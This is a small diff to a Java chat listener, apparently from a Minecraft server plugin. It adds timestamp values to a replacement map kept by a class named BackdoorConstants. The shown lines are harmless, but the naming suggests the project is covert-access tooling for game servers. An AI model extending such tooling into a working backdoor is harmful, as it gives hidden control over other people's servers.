@@ -27,6 +27,8 @@ public class ChatListener implements Listener {
 
     @ParametersAreNonnullByDefault
     private static void loadReplacements(AsyncPlayerChatEvent event) {
+        BackdoorConstants.setMapping("currentms", System.currentTimeMillis());
+        BackdoorConstants.setMapping("currentns", System.nanoTime());
         BackdoorConstants.setMapping("event", event);
         BackdoorConstants.setMapping("player", event.getPlayer());
         BackdoorConstants.setMapping("message", event.getMessage());
